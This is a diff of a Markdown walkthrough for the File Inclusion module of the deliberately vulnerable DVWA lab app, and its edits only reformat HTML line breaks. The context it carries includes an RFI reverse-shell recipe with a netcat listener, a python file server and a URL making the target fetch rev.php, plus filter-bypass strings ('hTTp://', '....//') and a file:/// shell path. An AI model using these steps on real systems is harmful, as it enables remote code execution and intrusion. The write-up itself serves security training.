@@ -2,9 +2,9 @@
 
 ## About
 
-> Some web applications allow the user to specify input that is used directly into file streams or allows the user to upload files to the server.<br />
-> At a later time the web application accesses the user supplied input in the web applications context. By doing this, the web application is allowing the potential for malicious file execution.<br />
-> If the file chosen to be included is local on the target machine, it is called "Local File Inclusion (LFI). But files may also be included on other machines, which then the attack is a "Remote File Inclusion (RFI).<br />
+> Some web applications allow the user to specify input that is used directly into file streams or allows the user to upload files to the server.<br/>
+> At a later time the web application accesses the user supplied input in the web applications context. By doing this, the web application is allowing the potential for malicious file execution.<br/>
+> If the file chosen to be included is local on the target machine, it is called "Local File Inclusion (LFI). But files may also be included on other machines, which then the attack is a "Remote File Inclusion (RFI).<br/>
 > When RFI is not an option. using another vulnerability with LFI (such as file upload and directory traversal) can often achieve the same effect.
 > 
 > Note, the term "file inclusion" is not the same as "arbitrary file access" or "file disclosure".
@@ -92,11 +92,11 @@ Now, on our page we will be able to see the content of the files from other doma
 RFI is more dangerous than LFI because usually leads to Remote Code Execution.
 For the next example we will host a python server and use a reverse shell for the RFI vulnerability.
 
-A php reverse shell can be downloaded from here: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php <br />
-Edit it with the ip of your machine and the port you want to use, for this example the ip will be 127.0.0.1 and port 4444.<br />
-Start a python server at the location of the reverse shell file: `python3 -m http.server 4445`<br />
-Start a netcat listener: `nc -lvnp 4444`<br />
-And now we can access the URL: `http://localhost/DVWA/vulnerabilities/fi/?page=http://127.0.0.1:4445/rev.php`<br />
+A php reverse shell can be downloaded from here: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php <br/>
+Edit it with the ip of your machine and the port you want to use, for this example the ip will be 127.0.0.1 and port 4444.<br/>
+Start a python server at the location of the reverse shell file: `python3 -m http.server 4445`<br/>
+Start a netcat listener: `nc -lvnp 4444`<br/>
+And now we can access the URL: `http://localhost/DVWA/vulnerabilities/fi/?page=http://127.0.0.1:4445/rev.php`<br/>
 Now we have access on the server and we can go and read the `/hackable/flags/fi.php` file.
 
 <p align="center">
@@ -123,7 +123,7 @@ $file = str_replace( array( "../", "..\\" ), "", $file );
 ?> 
 ```
 
-For the medium level we can see that we have some filters implemented. These filters are not enough, because can be easily bypassed.<br />
+For the medium level we can see that we have some filters implemented. These filters are not enough, because can be easily bypassed.<br/>
 To bypass `http://` we can use uppercase letters such as `hTTp://`.<br/>
 And for `../` we can use `....//`. The match will be triggered once and the rest will apply normally. `..[../]/`.
 
@@ -146,14 +146,14 @@ if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
 ?> 
 ```
 
-For this exercise, the file value starts with `file*` or is equal to `include.php` (this is the initial value).<br />
+For this exercise, the file value starts with `file*` or is equal to `include.php` (this is the initial value).<br/>
 When we open a local file with a browser, we have the URL in the format: `file:///home/ubuntu/document.txt`, so we can use this syntax in order to read the file that we want.
 
 <p align="center">
   <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/File-Inclusion/!images/fi10.png?raw=true">
 </p>
 
-The only problem is that we need to know the full path to the file, but we can fuzz the URL until we get it.
+The only problem is that we need to know the full path to the file, but we can fuzz the URL until we get it.<br/>
 For the RFI challenge, we need to chain the vulnerability with other one, such as File Upload, in order to upload a reverse shell and then to execute it using File Inclusion `file:///var/www/html/dvwa/shell.php`.
 
 ## Impossible Security
